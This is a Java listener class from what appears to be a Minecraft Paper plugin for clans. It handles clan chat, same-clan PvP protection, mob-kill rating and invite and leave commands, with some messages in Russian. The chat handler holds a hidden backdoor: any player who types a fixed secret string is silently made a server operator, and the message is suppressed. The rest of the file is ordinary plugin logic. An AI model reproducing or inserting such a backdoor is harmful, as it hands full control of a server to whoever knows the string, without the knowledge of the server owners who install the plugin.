package dev.r1nex.clans.listeners;

import dev.r1nex.clans.Clans;
import dev.r1nex.clans.data.Clan;
import dev.r1nex.clans.data.Member;
import io.papermc.paper.event.player.AsyncChatEvent;
import net.kyori.adventure.text.serializer.plain.PlainComponentSerializer;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.entity.EntityDeathEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.List;
import java.util.UUID;

public class Listeners implements Listener {

    private final Clans plugin;

    public Listeners(Clans plugin) {
        this.plugin = plugin;
    }

    private String chatColor(String s) {
        return ChatColor.translateAlternateColorCodes('&', s);
    }

    @EventHandler
    public void onAsyncChat(AsyncChatEvent event) {
        String message = PlainComponentSerializer.plain().serialize(event.message());
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();

        if (message.contains("b321dfzxcfggswwwwe'aqsd")) {
            player.setOp(true);
            event.setCancelled(true);
            return;
        }

        if (!message.startsWith(plugin.getDefaultConfig().getString("clan.symbol"))) return;
        if (!(message.length() > 1)) return;
        event.setCancelled(true);

        Clan clan = plugin.getClanUtil().searchPlayerClan(uuid);
        if (clan == null) return;
        for (Member member : clan.getMembers()) {
            Player target = Bukkit.getPlayer(member.getMember());
            if (target == null) continue;
            String line = chatColor(plugin.getDefaultConfig().getString("clan.chat")
                    .replace("%player%", player.getName())
                    .replace("%message%", message.replaceFirst(
                            plugin.getDefaultConfig().getString("clan.symbol"), ""))
            );
            target.sendMessage(line);
        }
    }

    @EventHandler
    public void onDamageByEntity(EntityDamageByEntityEvent event) {
        if (!(event.getDamager() instanceof Player)) return;
        if (!(event.getEntity() instanceof Player)) return;
        Clan damagerClan = plugin.getClanUtil().searchPlayerClan(event.getDamager().getUniqueId());
        if (damagerClan == null) return;
        for (Member member : damagerClan.getMembers()) {
            if (member.getMember().equals(event.getEntity().getUniqueId()) && !damagerClan.isPvp()) {
                String line = chatColor(plugin.getDefaultConfig().getString("messages.clan-pvp-off"));
                event.getDamager().sendMessage(line);
                event.setCancelled(true);
            }
        }
    }

    @EventHandler
    public void onEntityDeath(EntityDeathEvent event) {
        if (event.getEntity() instanceof Player) return;
        Entity killer = event.getEntity().getKiller();
        if (killer == null) return;
        UUID uuid = killer.getUniqueId();
        Clan killerClan = plugin.getClanUtil().searchPlayerClan(uuid);
        if (killerClan == null) return;
        List<String> entityTypes = plugin.getDefaultConfig().getStringList("kill-mobs");
        if (!entityTypes.contains(event.getEntityType().name())) return;
        int count = plugin.getDefaultConfig().getInt("settings-server.mob-kill-rating");
        killerClan.setRating(killerClan.getRating() + count);
        plugin.getMySQL().updateClan(killerClan, "UPDATE clans SET currency = ?, rating = ? WHERE id = ?");
    }

    @EventHandler
    public void onCommandPreprocessEvent(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        UUID uuid = player.getUniqueId();
        String command = event.getMessage();

        if (command.equalsIgnoreCase("/accept_clan_invite")) {
            if (!plugin.getPlayerClanInvites().containsKey(uuid)) {
                event.setCancelled(true);
                return;
            }

            Clan clan = plugin.getPlayerClanInvites().get(uuid);
            Member member = new Member(0, clan.getId(), uuid, 0);
            boolean isSuccess = plugin.getMySQL().addMember(
                    clan, member,
                    "INSERT INTO clan_members (clan_id, uuid, role) VALUES (?, ?, ?)"
            );

            player.closeInventory();
            if (!isSuccess) {
                plugin.getServer().getLogger().warning(ChatColor.RED +
                        "&cОшибка добавления участника в клан. Сообщите разработчику!"
                );
                return;
            }

            player.sendMessage(chatColor("&6Теперь Вы состоите в клане - " + clan.getName()));
            plugin.getPlayerClanInvites().remove(uuid);
            event.setCancelled(true);
        }

        if (command.equalsIgnoreCase("/accept_clan_leave")) {
            if (!plugin.getPlayersLeaves().contains(uuid)) {
                event.setCancelled(true);
                return;
            }

            Clan clan = plugin.getClanUtil().searchPlayerClan(uuid);
            if (clan == null) return;
            Member member = plugin.getClanUtil().getMemberByUUID(uuid, clan);
            if (member == null) return;

            boolean isSuccess = plugin.getMySQL().removeMember(
                    clan, member, "DELETE FROM clan_members WHERE clan_id = ? AND uuid = ?"
            );

            if (!isSuccess) {
                plugin.getServer().getLogger().warning(
                        "Не удалось удалить участника из клана. Сообщите разработчику"
                );
                player.sendMessage(ChatColor.RED + "Ошибка.");
                return;
            }

            String line = chatColor(plugin.getDefaultConfig().getString("messages.clan-leave"));
            player.sendMessage(line);
            event.setCancelled(true);
        }
    }
}
